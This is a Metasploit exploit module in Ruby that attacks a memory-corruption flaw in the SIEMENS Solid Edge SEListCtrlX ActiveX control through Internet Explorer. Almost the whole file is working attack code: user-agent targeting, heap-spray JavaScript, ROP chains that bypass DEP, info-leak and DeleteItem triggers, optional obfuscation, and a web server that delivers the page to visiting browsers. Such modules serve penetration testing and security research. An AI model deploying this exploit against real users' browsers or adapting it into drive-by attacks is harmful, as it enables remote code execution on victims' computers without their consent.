##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::RopDb
  include Msf::Exploit::Remote::BrowserAutopwn

  autopwn_info({
    :ua_name    => HttpClients::IE,
    :ua_minver  => "6.0",
    :ua_maxver  => "9.0",
    :javascript => true,
    :os_name    => OperatingSystems::WINDOWS,
    :rank       => Rank,
    :classid    => "{5D6A72E6-C12F-4C72-ABF3-32F6B70EBB0D}"
  })

  def initialize(info={})
    super(update_info(info,
      'Name'           => "SIEMENS Solid Edge ST4 SEListCtrlX ActiveX Remote Code Execution",
      'Description'    => %q{
        This module exploits the SEListCtrlX ActiveX installed with the SIEMENS Solid Edge product.
        The vulnerability exists on several APIs provided by the control, where user supplied input
        is handled as a memory pointer without proper validation, allowing an attacker to read and
        corrupt memory from the target process. This module abuses the methods NumChildren() and
        DeleteItem() in order to achieve memory info leak and remote code execution respectively.
        This module has been tested successfully on IE6-IE9 on Windows XP SP3 and Windows 7 SP1,
        using Solid Edge 10.4.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'rgod <rgod[at]autistici.org>', # Vulnerability discovery and PoC
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          [ 'OSVDB', '93696' ],
          [ 'EDB', '25712' ],
          [ 'URL', 'http://retrogod.altervista.org/9sg_siemens_adv_ii.htm' ]
        ],
      'Payload'        =>
        {
          'Space' => 906,
          'DisableNops' => true,
          'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
        },
      'DefaultOptions'  =>
        {
          'InitialAutoRunScript' => 'migrate -f'
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          # Jutil.dll 104.0.0.82
          # SEListCtrlX 104.0.0.82
          [ 'Automatic', {} ],
          [ 'IE 6 on Windows XP SP3', { 'Rop' => nil,  'Offset' => '0x5F4' } ],
          [ 'IE 7 on Windows XP SP3', { 'Rop' => nil,  'Offset' => '0x5F4' } ],
          [ 'IE 8 on Windows XP SP3', { 'Rop' => :msvcrt, 'Offset' => '0x5f4' } ],
          [ 'IE 7 on Windows Vista',  { 'Rop' => nil,  'Offset' => '0x5f4' } ],
          [ 'IE 8 on Windows Vista',  { 'Rop' => :jutil, 'Offset' => '0x5f4' } ],
          [ 'IE 8 on Windows 7',      { 'Rop' => :jutil, 'Offset' => '0x5f4' } ],
          [ 'IE 9 on Windows 7',      { 'Rop' => :jutil, 'Offset' => '0x5fe' } ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "May 26 2013",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])
      ], self.class)

  end

  def junk
    return rand_text_alpha(4).unpack("V").first
  end

  def get_target(agent)
    #If the user is already specified by the user, we'll just use that
    return target if target.name != 'Automatic'

    nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || ''
    ie = agent.scan(/MSIE (\d)/).flatten[0] || ''

    ie_name = "IE #{ie}"

    case nt
    when '5.1'
      os_name = 'Windows XP SP3'
    when '6.0'
      os_name = 'Windows Vista'
    when '6.1'
      os_name = 'Windows 7'
    end

    targets.each do |t|
      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))
        print_status("Target selected as: #{t.name}")
        return t
      end
    end

    return nil
  end

  # JUtil ROP Chain
  # Jutil Base: 0x1d550000
  # Stack Pivot: jutil_base + 0x000a5843 # xchg eax, esp # ret
  # Adjust Stack: jutil_base + 0x00212f17 # pop # pop # ret
  # 0x1db2e121, # POP EDX # RETN [JUtil.dll]
  # 0x1d5520ca, # ptr to &VirtualProtect() [IAT JUtil.dll]
  # 0x1da0ebeb, # MOV EDX,DWORD PTR DS:[EDX] # RETN [JUtil.dll]
  # 0x1da103d2, # MOV ESI,EDX # RETN [JUtil.dll]
  # 0x1d70e314, # POP EBP # RETN [JUtil.dll]
  # 0x1d5fc8e8, # & jmp esp [JUtil.dll]
  # 0x1d631859, # POP EBX # RETN [JUtil.dll]
  # 0x00000201, # 0x00000201-> ebx
  # 0x1d769cf9, # POP EDX # RETN [JUtil.dll]
  # 0x00000040, # 0x00000040-> edx
  # 0x1d6d2e50, # POP ECX # RETN [JUtil.dll]
  # 0x1da45217, # &Writable location [JUtil.dll]
  # 0x1d632fd1, # POP EDI # RETN [JUtil.dll]
  # 0x1d6839db, # RETN (ROP NOP) [JUtil.dll]
  # 0x1d752439, # POP EAX # RETN [JUtil.dll]
  # 0x90909090, # nop
  # 0x1da4cfe3, # PUSHAD # RETN [JUtil.dll]
  def ie9_spray(t, p)
    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(t.arch))
    js_random_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(t.arch))

    js = %Q|

    function rop_chain(jutil_base){
      var arr = [
        Number(Math.floor(Math.random()*0xffffffff)),
        Number(0x0c0c0c0c),
        Number(0x0c0c0c0c),
        Number(0x0c0c0c1c),
        Number(0x0c0c0c24),
        Number(0x0c0c0c28),
        Number(Math.floor(Math.random()*0xffffffff)),
        Number(Math.floor(Math.random()*0xffffffff)),
        Number(0x0c0c0c0c),
        Number(0x0c0c0c3c),
        jutil_base + Number(0x00212f17),
        jutil_base + Number(0x000a5843),
        Number(0x0c0c0c34),
        jutil_base + Number(0x5de121),
        jutil_base + Number(0x20ca),
        jutil_base + Number(0x4bebeb),
        jutil_base + Number(0x4c03d2),
        jutil_base + Number(0x1be314),
        jutil_base + Number(0xac8e8),
        jutil_base + Number(0xe1859),
        Number(0x00000201),
        jutil_base + Number(0x219cf9),
        Number(0x00000040),
        jutil_base + Number(0x182e50),
        jutil_base + Number(0x4f5217),
        jutil_base + Number(0xe2fd1),
        jutil_base + Number(0x1339db),
        jutil_base + Number(0x202439),
        Number(0x90909090),
        jutil_base + Number(0x4fcfe3)
      ];
      return arr;
    }

    function d2u(dword){
      var uni = String.fromCharCode(dword & 0xFFFF);
      uni += String.fromCharCode(dword>>16);
      return uni;
    }

    function tab2uni(tab){
      var uni = ""
      for(var i=0;i<tab.length;i++){
        uni += d2u(tab[i]);
      }
      return uni;
    }

    function randomblock(blocksize)
    {
      var theblock = "";
      for (var i = 0; i < blocksize; i++)
      {
        theblock += Math.floor(Math.random()*90)+10;
      }
      return theblock;
    }

    function tounescape(block)
    {
      var blocklen = block.length;
      var unescapestr = "";
      for (var i = 0; i < blocklen-1; i=i+4)
      {
        unescapestr += "%u" + block.substring(i,i+4);
      }
      return unescapestr;
    }

    var heap_obj = new heapLib.ie(0x10000);
    var code = unescape("#{js_code}");
    var nops = unescape("#{js_random_nops}");

    function heap_spray(jutil_base) {
      while (nops.length < 0x80000) nops += nops;
      var offset_length = #{t['Offset']};
      for (var i=0; i < 0x1000; i++) {
        var padding = unescape(tounescape(randomblock(0x1000)));
        while (padding.length < 0x1000) padding+= padding;
        var junk_offset = padding.substring(0, offset_length);
        var rop = tab2uni(rop_chain(jutil_base));
        var single_sprayblock = junk_offset + rop + code + nops.substring(0, 0x800 - rop.length -  code.length - junk_offset.length);
        while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;
        sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);
        heap_obj.alloc(sprayblock);
      }
    }
    |
    return js
  end

  def ie8_spray(t, p)
    js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(t.arch))
    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(t.arch))

    js = %Q|
    var heap_obj = new heapLib.ie(0x20000);
    var code = unescape("#{js_code}");
    var nops = unescape("#{js_nops}");

    function rop_chain(jutil_base){
      var arr = [
        Number(Math.floor(Math.random()*0xffffffff)),
        Number(0x0c0c0c0c),
        Number(0x0c0c0c0c),
        Number(0x0c0c0c1c),
        Number(0x0c0c0c24),
        Number(0x0c0c0c28),
        Number(Math.floor(Math.random()*0xffffffff)),
        Number(Math.floor(Math.random()*0xffffffff)),
        Number(0x0c0c0c0c),
        Number(0x0c0c0c3c),
        jutil_base + Number(0x00212f17),
        jutil_base + Number(0x000a5843),
        Number(0x0c0c0c34),
        jutil_base + Number(0x5de121),
        jutil_base + Number(0x20ca),
        jutil_base + Number(0x4bebeb),
        jutil_base + Number(0x4c03d2),
        jutil_base + Number(0x1be314),
        jutil_base + Number(0xac8e8),
        jutil_base + Number(0xe1859),
        Number(0x00000201),
        jutil_base + Number(0x219cf9),
        Number(0x00000040),
        jutil_base + Number(0x182e50),
        jutil_base + Number(0x4f5217),
        jutil_base + Number(0xe2fd1),
        jutil_base + Number(0x1339db),
        jutil_base + Number(0x202439),
        Number(0x90909090),
        jutil_base + Number(0x4fcfe3)
      ];
      return arr;
    }

    function d2u(dword){
      var uni = String.fromCharCode(dword & 0xFFFF);
      uni += String.fromCharCode(dword>>16);
      return uni;
    }

    function tab2uni(tab){
      var uni = ""
      for(var i=0;i<tab.length;i++){
        uni += d2u(tab[i]);
      }
      return uni;
    }

    function heap_spray(jutil_base) {
      while (nops.length < 0x80000) nops += nops;
      var offset = nops.substring(0, #{t['Offset']});
      var rop = tab2uni(rop_chain(jutil_base));
      var shellcode = offset + rop + code + nops.substring(0, 0x800-rop.length-code.length-offset.length);
      while (shellcode.length < 0x40000) shellcode += shellcode;
      var block = shellcode.substring(0, (0x80000-6)/2);
      heap_obj.gc();
      for (var i=1; i < 0x300; i++) {
        heap_obj.alloc(block);
      }
    }
    |
    return js
  end

  def ie6_spray(t, p)
    js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(t.arch))
    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(t.arch))

    js = %Q|
    var heap_obj = new heapLib.ie(0x20000);
    var nops = unescape("#{js_nops}");
    var code = unescape("#{js_code}");

    function heap_spray() {
      while (nops.length < 0x80000) nops += nops;
      var offset = nops.substring(0, #{t['Offset']});
      var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
      while (shellcode.length < 0x40000) shellcode += shellcode;
      var block = shellcode.substring(0, (0x80000-6)/2);
      heap_obj.gc();
      for (var i=1; i < 0x300; i++) {
        heap_obj.alloc(block);
      }
    }
    |
    return js
  end

  def ie_heap_spray(my_target, p)
    # Land the payload at 0x0c0c0c0c
    case my_target
    when targets[7]
      # IE 9 on Windows 7
      js = ie9_spray(my_target, p)
    when targets[5], targets[6]
      # IE 8 on Windows 7 and Windows Vista
      js = ie8_spray(my_target, p)
    else
      js = ie6_spray(my_target, p)
    end

    js = heaplib(js, {:noobfu => true})

    if datastore['OBFUSCATE']
      js = ::Rex::Exploitation::JSObfu.new(js)
      js.obfuscate
      @heap_spray_fn = js.sym("heap_spray")
    else
      @heap_spray_fn = "heap_spray"
    end

    return js
  end

  def get_windows_xp_payload
    fake_memory = [
        junk,       # junk         # 0c0c0c0c
        0x0c0c0c0c, # Dereference  # 0c0c0c10
        0x0c0c0c0c, # Dereference  # 0c0c0c14
        0x0c0c0c1c, # [0x0c0c0c0c] # 0c0c0c18
        0x0c0c0c24, # Dereference  # 0c0c0c1c
        0x0c0c0c28, # Dereference  # 0c0c0c20
        junk,       # junk         # 0c0c0c24
        junk,       # junk         # 0c0c0c28
        0x0c0c0c0c, # Dereference  # 0c0c0c2c
        0x0c0c0c30, # Dereference  # 0c0c0c30
        0x0c0c0c38, # new eip      # 0c0c0c34
    ].pack("V*")

    p = fake_memory + payload.encoded

    return p
  end

  def get_windows_msvcrt_payload
    fake_memory = [
        junk,       # junk         # 0c0c0c0c
        0x0c0c0c0c, # Dereference  # 0c0c0c10
        0x0c0c0c0c, # Dereference  # 0c0c0c14
        0x0c0c0c1c, # [0x0c0c0c0c] # 0c0c0c18
        0x0c0c0c24, # Dereference  # 0c0c0c1c
        0x0c0c0c28, # Dereference  # 0c0c0c20
        junk,       # junk         # 0c0c0c24
        junk,       # junk         # 0c0c0c28
        0x0c0c0c0c, # Dereference  # 0c0c0c2c
        0x0c0c0c3c, # Dereference  # 0c0c0c30
        0x77c21ef4, # ppr msvcrt   # 0c0c0c34
        0x77c15ed5, # xchg eax,esp # ret (msvcrt)
        0x0c0c0c34  # eax value    # 0c0c0c3c
    ].pack("V*")

    return generate_rop_payload('msvcrt', payload.encoded, {'pivot'=> fake_memory, 'target'=>'xp'})
  end

  def get_payload(t)

    # Both ROP chains generated by mona.py - See corelan.be
    case t['Rop']
    when :msvcrt
      print_status("Using msvcrt ROP")
      p = get_windows_msvcrt_payload
    when :jutil
      print_status("Using JUtil ROP built dynamically...")
      p = payload.encoded
    else
      print_status("Using payload without ROP...")
      p = get_windows_xp_payload
    end

    return p
  end

  def info_leak_trigger
    js = <<-EOS
    <object classid='clsid:5D6A72E6-C12F-4C72-ABF3-32F6B70EBB0D' id='obj' />
    </object>
    <script language='javascript'>
    jutil_address = obj.NumChildren(0x10017018 - 0x0c);
    jutil_base = jutil_address - 0x49440;
    #{@heap_spray_fn}(jutil_base);
    obj.DeleteItem(0x0c0c0c08);
    </script>
    EOS

    return js
  end

  def exec_trigger
    js = <<-EOS
    <object classid='clsid:5D6A72E6-C12F-4C72-ABF3-32F6B70EBB0D' id='obj' />
    </object>
    <script language='javascript'>
    #{@heap_spray_fn}();
    obj.DeleteItem(0x0c0c0c08);
    </script>
    EOS

    return js
  end

  def get_trigger(t)
    case t['Rop']
      when :jutil
        js = info_leak_trigger
      else
        js = exec_trigger
    end

    return js
  end

  def load_exploit_html(my_target)
    p  = get_payload(my_target)
    js = ie_heap_spray(my_target, p)
    trigger = get_trigger(my_target)

    html = %Q|
    <html>
    <head>
    <script language='javascript'>
    #{js}
    </script>
    </head>
    <body>
    #{trigger}
    </body>
    </html>
    |

    return html
  end

  def on_request_uri(cli, request)
    agent = request.headers['User-Agent']
    uri   = request.uri
    print_status("Requesting: #{uri}")

    my_target = get_target(agent)
    # Avoid the attack if no suitable target found
    if my_target.nil?
      print_error("Browser not supported, sending 404: #{agent}")
      send_not_found(cli)
      return
    end

    html = load_exploit_html(my_target)
    html = html.gsub(/^\t\t/, '')
    print_status("Sending HTML...")
    send_response(cli, html, {'Content-Type'=>'text/html'})
  end

end
